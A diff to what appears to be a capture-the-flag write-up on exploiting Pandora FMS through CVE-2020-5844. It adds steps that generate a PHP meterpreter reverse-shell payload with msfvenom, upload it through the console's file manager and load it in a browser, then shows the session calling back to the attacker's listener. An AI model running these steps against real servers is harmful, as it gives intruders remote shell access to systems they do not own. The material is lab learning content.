@@ -73,14 +73,37 @@ http://127.0.0.1/pandora_console/
 
 ## CVE-2020-5844
 
-8. Crie o payload e inicie o multi handler
+8. Create the payload then start multi handler
 
 ````bash
 $ msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -o payload.php
 $ msfconsole -qx "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LPORT 4444; set LHOST tun0; exploit"
 ````
 
+9. Upload the file to the vulnerable URL
+````
+http://127.0.0.1/pandora_console/index.php?sec=gextensions&sec2=godmode/setup/file_manager
+````
 
+10. Access it on your browser
+````
+http://127.0.0.1/pandora_console/images/payload.php
+````
+
+````bash
+root@kali:~# msfconsole -qx "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LPORT 4444; set LHOST tun0; exploit"
+[*] Using configured payload generic/shell_reverse_tcp
+PAYLOAD => php/meterpreter/reverse_tcp
+LPORT => 4444
+LHOST => tun0
+[*] Started reverse TCP handler on 10.10.14.221:4444 
+[*] Sending stage (39282 bytes) to 10.10.11.136
+[*] Meterpreter session 1 opened (10.10.14.221:4444 -> 10.10.11.136:37560 ) at 2022-01-21 16:42:47 -0500
+
+meterpreter > getuid 
+Server username: matt
+meterpreter >
+````
 
 
 [OID repository](http://www.oid-info.com/get/1.3.6.1.2.1.25.4.2.1.5)
